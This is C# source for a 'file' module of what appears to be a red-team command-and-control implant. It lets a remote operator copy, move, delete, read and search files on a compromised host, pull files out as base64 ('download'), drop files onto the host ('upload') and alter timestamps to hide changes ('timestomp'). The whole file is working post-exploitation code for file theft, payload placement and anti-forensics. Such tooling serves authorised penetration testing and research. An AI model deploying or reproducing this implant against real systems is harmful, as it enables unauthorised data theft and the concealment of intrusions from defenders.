using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace Agent.Modules
{
    class FileModule : IAgentModule
    {
        AgentController Agent;
        ConfigController Config;

        public void Init(AgentController agent, ConfigController config)
        {
            Agent = agent;
            Config = config;
        }

        public AgentModuleInfo GetModuleInfo()
        {
            return new AgentModuleInfo
            {
                Name = "file",
                Description = "Stuff with files",
                Developers = new List<Developer>
                {
                    new Developer { Name = "Daniel Duggan", Handle = "@_RastaMouse" },
                    new Developer { Name = "Adam Chester", Handle = "@_xpn_" }
                },
                Commands = new List<AgentCommand>
                {
                    new AgentCommand
                    {
                        Name = "cp",
                        Description = "Copy a file",
                        HelpText = "file cp [source] [destination]",
                        CallBack = CopyFile
                    },
                    new AgentCommand
                    {
                        Name = "mv",
                        Description = "Move a file",
                        HelpText = "file mv [source] [destination]",
                        CallBack = MoveFile
                    },
                    new AgentCommand
                    {
                        Name =  "rm",
                        Description = "Delete a file",
                        HelpText = "file rm [path]",
                        CallBack = RemoveFile
                    },
                    new AgentCommand
                    {
                        Name = "cat",
                        Description = "Read the (string) content of a file",
                        HelpText = "file cat [path]",
                        CallBack = ReadFile
                    },
                    new AgentCommand
                    {
                        Name = "download",
                        Description = "Download a file",
                        HelpText = "file download [path]",
                        CallBack = DownloadFile
                    },
                    new AgentCommand
                    {
                        Name = "upload",
                        Description = "Upload a file",
                        HelpText = "file upload [source] [destination]",
                        CallBack = UploadFile
                    },
                    new AgentCommand
                    {
                        Name = "search",
                        Description = "Search filesystem recursively for a filename pattern",
                        HelpText = "file search [directory] [pattern]",
                        CallBack = SearchForFile
                    },
                    new AgentCommand
                    {
                        Name = "timestomp",
                        Description = "Copy timestamp information from one file to another",
                        HelpText = "file timestomp [source] [target]",
                        CallBack = ChangeFileTimestamp
                    },
                }
            };
        }

        private void CopyFile(byte[] data)
        {
            try
            {
                var file = Encoding.UTF8.GetString(data).Split(' ');
                File.Copy(file[0], file[1], true);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void MoveFile(byte[] data)
        {
            try
            {
                var file = Encoding.UTF8.GetString(data).Split(' ');
                File.Move(file[0], file[1]);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void RemoveFile(byte[] data)
        {
            try
            {
                File.Delete(Encoding.UTF8.GetString(data));
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ReadFile(byte[] data)
        {
            try
            {
                var text = File.ReadAllText(Encoding.UTF8.GetString(data));
                Agent.SendOutput(text);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void DownloadFile(byte[] data)
        {
            try
            {
                var path = Encoding.UTF8.GetString(data);
                var file = Convert.ToBase64String(File.ReadAllBytes(path));
                Agent.SendOutput(file);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void UploadFile(byte[] data)
        {
            try
            {
                var file = Encoding.UTF8.GetString(data).Split(' ');
                File.WriteAllBytes(file[1], Convert.FromBase64String(file[0]));
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void SearchForFile(byte[] data)
        {
            try
            {
                var search = Encoding.UTF8.GetString(data).Split(' ');
                var files = Directory.GetFiles(search[0], search[1], SearchOption.AllDirectories);
                var result = string.Join("\n", files);
                Agent.SendOutput(result);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }

        private void ChangeFileTimestamp(byte[] data)
        {
            try
            {
                var timestomp = Encoding.UTF8.GetString(data).Split(' ');
                var source = new FileInfo(timestomp[0]);

                File.SetCreationTime(timestomp[1], source.CreationTime);
                File.SetCreationTimeUtc(timestomp[1], source.CreationTimeUtc);

                File.SetLastWriteTime(timestomp[1], source.LastWriteTime);
                File.SetLastWriteTimeUtc(timestomp[1], source.LastWriteTimeUtc);

                File.SetLastAccessTime(timestomp[1], source.LastAccessTime);
                File.SetLastAccessTimeUtc(timestomp[1], source.LastAccessTimeUtc);
            }
            catch (Exception e)
            {
                Agent.SendError(e.Message);
            }
        }
    }
}